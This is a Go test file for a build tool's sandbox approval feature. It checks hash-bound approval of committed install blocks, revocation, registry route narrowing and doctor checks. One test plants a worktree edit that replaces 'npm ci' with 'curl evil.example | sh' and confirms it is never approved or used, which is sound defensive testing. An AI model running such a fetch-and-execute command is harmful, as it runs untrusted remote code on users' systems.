package main

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"buildgate/internal/memory"
	"buildgate/internal/projectconfig"
	"buildgate/internal/release"
	"buildgate/internal/sandbox"
	"buildgate/internal/toolchain"
)

const sandboxFactoryYML = "verify_command: \"make verify\"\nsandbox:\n  version: 1\n  install: [\"npm ci\"]\n  cache_paths: [\"node_modules\"]\n  registries: [npm]\n"

// sandboxRepo is a committed fixture repository whose .factory.yml carries
// sandboxFactoryYML, with its data dir and the block's hash.
func sandboxRepo(t *testing.T, yml string) (repo, dataDir, hash string) {
	t.Helper()
	repo = newFixtureRepo(t)
	commitFactoryYML(t, repo, yml)
	cfg, _, err := projectconfig.Load(repo)
	if err != nil || cfg.Sandbox == nil {
		t.Fatalf("Load: %v, %+v", err, cfg)
	}
	return repo, t.TempDir(), cfg.Sandbox.SHA256()
}

func repoKeyOf(repo string) string {
	root := release.RepositoryRoot(repo)
	return memory.StoreKey(filepath.Base(root), root)
}

// runSandbox runs `factoryd sandbox <args>` on a non-terminal stdin.
func runSandbox(t *testing.T, args ...string) (string, error) {
	t.Helper()
	var out strings.Builder
	err := sandboxRun(newSandboxFlags(), args, strings.NewReader(""), &out)
	return out.String(), err
}

// forbidDocker makes every docker boundary call that could start or build
// something fail the test.
func forbidDocker(t *testing.T, dp *deps) {
	t.Helper()
	fake := fakeDockerOf(dp)
	fake.imageToolsFn = func(context.Context, string, string) (toolchain.Installed, string, error) {
		t.Error("a docker image inspection ran")
		return nil, "", nil
	}
	fake.toolImageFn = func(context.Context, string, string, []string) (string, error) {
		t.Error("a toolchain image was built")
		return "", nil
	}
	fake.requiredBinariesFn = func(context.Context, string, string, string, []string) ([]string, error) {
		t.Error("a sandbox was launched to probe binaries")
		return nil, nil
	}
}

func sandboxTicketRun(t *testing.T, dp *deps, repo, dataDir string, proxy bool) *ticketRun {
	t.Helper()
	full := ""
	image, docker, user, uid := "worker@sha256:aaaa", "docker", "65532:65532", sandbox.DefaultWorkerUID
	root := release.RepositoryRoot(repo)
	tr := &ticketRun{
		dp: dp, lifecycleCtx: context.Background(), workspace: &repo, fullSuiteCommand: &full,
		resolvedWorkspace: repo, repositoryRoot: root, project: filepath.Base(root), sandboxDataDir: dataDir,
		registryProxy: &proxy, sandboxImage: &image, sandboxDocker: &docker, sandboxUser: &user, sandboxWorkerUID: &uid,
	}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatalf("applyCommittedProjectConfig: %v", err)
	}
	return tr
}

func TestRunRefusesAnUnapprovedSandboxBlockBeforeAnyLaunch(t *testing.T) {
	repo, dataDir, hash := sandboxRepo(t, sandboxFactoryYML)
	dp := newTestDeps(t)
	forbidDocker(t, dp)
	tr := sandboxTicketRun(t, dp, repo, dataDir, true)
	if tr.sandbox == nil || len(tr.setup) != 0 {
		t.Errorf("sandbox %+v, setup %q: want the block read and no setup", tr.sandbox, tr.setup)
	}
	err := tr.fitSandboxToRepository()
	if err == nil {
		t.Fatal("an unapproved sandbox block was accepted")
	}
	root := release.RepositoryRoot(repo)
	want := "sandbox: the sandbox block " + hash[:12] + " of .factory.yml at " + tr.projectConfigCommitSHA[:12] + " is not approved (approvals are read from " + projectconfig.OpenApprovals(dataDir).Path(repoKeyOf(repo)) + "): factoryd sandbox approve -repo " + root
	if err.Error() != want {
		t.Errorf("error = %q, want %q", err, want)
	}

	// Approved, but the registry proxy is off: the install has no registry.
	if err := projectconfig.OpenApprovals(dataDir).Approve(repoKeyOf(repo), projectconfig.Approval{SandboxSHA256: hash}); err != nil {
		t.Fatal(err)
	}
	if err := sandboxTicketRun(t, dp, repo, dataDir, true).requireSandboxApproved(); err != nil {
		t.Errorf("approved block: %v", err)
	}
	if err := sandboxTicketRun(t, dp, repo, dataDir, false).fitSandboxToRepository(); err == nil || !strings.Contains(err.Error(), "registry_proxy is off") {
		t.Errorf("proxy off: error = %v, want the registry proxy refusal", err)
	}
}

// The block and the approval it needs come from the committed .factory.yml:
// an edit in the worktree neither needs approval nor borrows one.
func TestSandboxApprovalReadsHEADNotTheWorktree(t *testing.T) {
	repo, dataDir, hash := sandboxRepo(t, sandboxFactoryYML)
	edited := strings.Replace(sandboxFactoryYML, "npm ci", "curl evil.example | sh", 1)
	if err := os.WriteFile(filepath.Join(repo, ".factory.yml"), []byte(edited), 0o644); err != nil {
		t.Fatal(err)
	}
	evil, err := projectconfig.Parse([]byte(edited))
	if err != nil {
		t.Fatal(err)
	}
	store := projectconfig.OpenApprovals(dataDir)
	dp := newTestDeps(t)
	forbidDocker(t, dp)

	// Only the worktree's block is approved: the committed one still is not.
	if err := store.Approve(repoKeyOf(repo), projectconfig.Approval{SandboxSHA256: evil.Sandbox.SHA256()}); err != nil {
		t.Fatal(err)
	}
	if err := sandboxTicketRun(t, dp, repo, dataDir, true).fitSandboxToRepository(); err == nil || !strings.Contains(err.Error(), hash[:12]) {
		t.Fatalf("error = %v, want a refusal naming the committed block %s", err, hash[:12])
	}
	if _, err := runSandbox(t, "approve", "-repo", repo, "-data-dir", dataDir, "-sha256", evil.Sandbox.SHA256()); err == nil {
		t.Error("approve accepted the worktree block's hash")
	}
	out, err := runSandbox(t, "show", "-repo", repo, "-data-dir", dataDir)
	if err != nil || !strings.Contains(out, hash) || strings.Contains(out, "evil.example") || !strings.Contains(out, "NOT approved") {
		t.Errorf("show = %q, %v; want the committed block, not approved", out, err)
	}

	// Only the committed block is approved: a run uses it, whatever the
	// worktree says.
	if _, err := store.Revoke(repoKeyOf(repo), evil.Sandbox.SHA256()); err != nil {
		t.Fatal(err)
	}
	if err := store.Approve(repoKeyOf(repo), projectconfig.Approval{SandboxSHA256: hash}); err != nil {
		t.Fatal(err)
	}
	tr := sandboxTicketRun(t, dp, repo, dataDir, true)
	if err := tr.requireSandboxApproved(); err != nil {
		t.Errorf("committed block approved, worktree edited: %v", err)
	}
	if want := []string{"npm ci"}; tr.sandbox == nil || !reflect.DeepEqual(tr.sandbox.Install, want) {
		t.Errorf("sandbox = %+v, want the committed install %q", tr.sandbox, want)
	}
}

func TestSandboxApproveBindsTheShownHash(t *testing.T) {
	repo, dataDir, hash := sandboxRepo(t, sandboxFactoryYML)
	store := projectconfig.OpenApprovals(dataDir)
	args := func(extra ...string) []string {
		return append([]string{"approve", "-repo", repo, "-data-dir", dataDir}, extra...)
	}
	// No terminal and no -sha256: nothing is recorded.
	if out, err := runSandbox(t, args()...); err == nil || !strings.Contains(err.Error(), "-sha256 "+hash) || !strings.Contains(out, hash) {
		t.Errorf("approve without a terminal = %v, output %q; want the block shown and a demand for -sha256", err, out)
	}
	// A hash other than the committed block's.
	wrong := strings.Repeat("0", 64)
	if _, err := runSandbox(t, args("-sha256", wrong)...); err == nil || !strings.Contains(err.Error(), "not the committed block's hash") {
		t.Errorf("approve with a wrong hash = %v", err)
	}
	if _, ok := store.Approved(repoKeyOf(repo), hash); ok {
		t.Fatal("a refused approve recorded an approval")
	}
	out, err := runSandbox(t, args("-sha256", hash)...)
	if err != nil {
		t.Fatalf("approve: %v", err)
	}
	if !strings.Contains(out, "install:") || !strings.Contains(out, hash) {
		t.Errorf("approve output %q should show the block and its hash", out)
	}
	rec, ok := store.Approved(repoKeyOf(repo), hash)
	if !ok || rec.Commit != projectconfig.HeadCommit(repo) || rec.ApprovedBy == "" || !strings.Contains(rec.Block, "npm ci") {
		t.Errorf("approval = %+v, %v; want the commit, the approver and the block", rec, ok)
	}
	if out, err := runSandbox(t, "show", "-repo", repo, "-data-dir", dataDir); err != nil || !strings.Contains(out, "approved by") {
		t.Errorf("show after approve = %q, %v", out, err)
	}
	if _, err := runSandbox(t, "show", "-repo", repo, "-data-dir", dataDir, "-sha256", hash); err == nil {
		t.Error("show accepted -sha256")
	}
	// Revoke.
	if _, err := runSandbox(t, args("-revoke", hash)...); err != nil {
		t.Fatalf("revoke: %v", err)
	}
	if _, ok := store.Approved(repoKeyOf(repo), hash); ok {
		t.Error("revoked block still approved")
	}
	if _, err := runSandbox(t, args("-revoke", hash)...); err == nil {
		t.Error("revoking an absent approval succeeded")
	}
	// A repository with no block has nothing to approve.
	plain := newFixtureRepo(t)
	commitFactoryYML(t, plain, "verify_command: \"make verify\"\n")
	if _, err := runSandbox(t, "approve", "-repo", plain, "-data-dir", dataDir, "-sha256", hash); err == nil || !strings.Contains(err.Error(), "no sandbox block") {
		t.Errorf("approve with no block = %v", err)
	}
	if _, err := runSandbox(t, "frob", "-repo", repo); err == nil {
		t.Error("an unknown subcommand succeeded")
	}
}

func TestRegistriesNarrowTheProxyRoutes(t *testing.T) {
	all := sandbox.DefaultRegistryProxyRoutes()
	prefixes := func(routes []sandbox.RegistryProxyRoute) []string {
		var out []string
		for _, r := range routes {
			out = append(out, r.Prefix)
		}
		return out
	}
	for _, tc := range []struct {
		registries []string
		want       []string
	}{
		{nil, prefixes(all)},
		{[]string{"npm"}, []string{"/npm/"}},
		{[]string{"pypi"}, []string{"/pypi/", "/pypi-files/"}},
		{[]string{"go"}, []string{"/gomodproxy/sumdb/sum.golang.org/", "/gomodproxy/"}},
		{[]string{"go", "npm"}, []string{"/npm/", "/gomodproxy/sumdb/sum.golang.org/", "/gomodproxy/"}},
		{[]string{"maven"}, []string{"/maven/"}},
		{[]string{"rubygems"}, []string{"/rubygems/"}},
	} {
		got, err := sandbox.NarrowRegistryRoutes(all, tc.registries)
		if err != nil {
			t.Errorf("%v: %v", tc.registries, err)
			continue
		}
		if !reflect.DeepEqual(prefixes(got), tc.want) {
			t.Errorf("%v narrowed to %q, want %q", tc.registries, prefixes(got), tc.want)
		}
		for _, r := range got { // narrowing keeps the operator's routes as they were
			found := false
			for _, a := range all {
				found = found || reflect.DeepEqual(a, r)
			}
			if !found {
				t.Errorf("%v: route %+v is not one of the operator's", tc.registries, r)
			}
		}
	}
	// Narrowing never widens: a registry the operator's routes lack is an error.
	if _, err := sandbox.NarrowRegistryRoutes(all[:1], []string{"pypi"}); err == nil {
		t.Error("a registry the proxy does not serve was accepted")
	}
	if _, err := sandbox.NarrowRegistryRoutes(all, []string{"cargo"}); err == nil {
		t.Error("an unknown registry was accepted")
	}
	for _, name := range projectconfig.SandboxRegistries {
		if _, err := sandbox.NarrowRegistryRoutes(all, []string{name}); err != nil {
			t.Errorf("the sandbox block may list %q, but the proxy cannot narrow to it: %v", name, err)
		}
	}
}

func TestDoctorTargetRepoReportsSandboxApproval(t *testing.T) {
	repo := commitFiles(t, map[string]string{".factory.yml": sandboxFactoryYML})
	cfg, _, err := projectconfig.Load(repo)
	if err != nil {
		t.Fatal(err)
	}
	in := doctorTargetRepoInputs(repo, "docker")
	in.dataDir = t.TempDir()

	checks := doctorCheckSandboxBlock(in)
	if len(checks) != 2 || checks[0].Err == nil || !strings.Contains(checks[0].Fix, "factoryd sandbox approve -repo "+release.RepositoryRoot(repo)) {
		t.Fatalf("unapproved: checks = %#v, want a failing approval row naming the approve command", checks)
	}
	if !strings.HasPrefix(checks[0].Name, "sandbox block "+cfg.Sandbox.SHA256()[:12]) || !strings.HasPrefix(checks[1].Name, "sandbox registries: npm") || checks[1].Err != nil {
		t.Errorf("names = %q, %q; registries error = %v", checks[0].Name, checks[1].Name, checks[1].Err)
	}
	if err := projectconfig.OpenApprovals(in.dataDir).Approve(repoKeyOf(repo), projectconfig.Approval{SandboxSHA256: cfg.Sandbox.SHA256(), ApprovedBy: "alice", ApprovedAt: "2026-10-20T10:00:00Z"}); err != nil {
		t.Fatal(err)
	}
	checks = doctorCheckSandboxBlock(in)
	if len(checks) != 2 || checks[0].Err != nil || !strings.Contains(checks[0].Name, "approved by alice at 2026-10-20T10:00:00Z") {
		t.Errorf("approved: checks = %#v", checks)
	}
	in.settings.RegistryProxyConfigured, in.settings.RegistryProxy = true, false
	if checks = doctorCheckSandboxBlock(in); checks[1].Err == nil || !strings.Contains(checks[1].Err.Error(), "registry_proxy is off") {
		t.Errorf("proxy off: registries row = %#v", checks[1])
	}
	if got := doctorCheckSandboxBlock(doctorTargetRepoInputs(commitFiles(t, map[string]string{".factory.yml": "verify_command: x\n"}), "docker")); got != nil {
		t.Errorf("a repository with no block has rows: %#v", got)
	}
}

func TestSandboxBlockDraftComesFromTheLanguageProfile(t *testing.T) {
	node := commitFiles(t, map[string]string{"package.json": "{}\n", "package-lock.json": "{}\n"})
	draft := sandboxBlockDraft(node)
	cfg, err := projectconfig.Parse([]byte(draft))
	if err != nil || cfg.Sandbox == nil {
		t.Fatalf("draft %q does not parse as a sandbox block: %v", draft, err)
	}
	want := projectconfig.Sandbox{Version: 1, Install: []string{"npm ci"}, CachePaths: []string{"node_modules"}, Registries: []string{"npm"}}
	if !reflect.DeepEqual(*cfg.Sandbox, want) {
		t.Errorf("node draft = %+v, want %+v", *cfg.Sandbox, want)
	}
	if note := sandboxDraftNote(node); !strings.Contains(note, "factoryd sandbox approve -repo") {
		t.Errorf("note = %q", note)
	}
	if got := factoryYMLWithSandbox(node, "npm test", "brownfield"); !strings.HasPrefix(got, factoryYMLContent("npm test", "brownfield")) || !strings.HasSuffix(got, draft) {
		t.Errorf("factoryYMLWithSandbox = %q", got)
	}
	py := commitFiles(t, map[string]string{"requirements.txt": "flask\n"})
	if cfg, err := projectconfig.Parse([]byte(sandboxBlockDraft(py))); err != nil || cfg.Sandbox == nil || cfg.Sandbox.CachePaths[0] != ".venv" || cfg.Sandbox.Registries[0] != "pypi" {
		t.Errorf("python draft: %+v, %v", cfg, err)
	}
	for name, files := range map[string]map[string]string{
		"no lockfile":  {"package.json": "{}\n"},
		"go":           {"go.mod": "module m\n"},
		"no profile":   {"README.md": "x\n"},
		"two profiles": {"package.json": "{}\n", "package-lock.json": "{}\n", "go.mod": "module m\n"},
	} {
		if got := sandboxBlockDraft(commitFiles(t, files)); got != "" {
			t.Errorf("%s: draft = %q, want none", name, got)
		}
		if got := factoryYMLWithSandbox(commitFiles(t, files), "x", "brownfield"); got != factoryYMLContent("x", "brownfield") {
			t.Errorf("%s: .factory.yml changed", name)
		}
	}
}
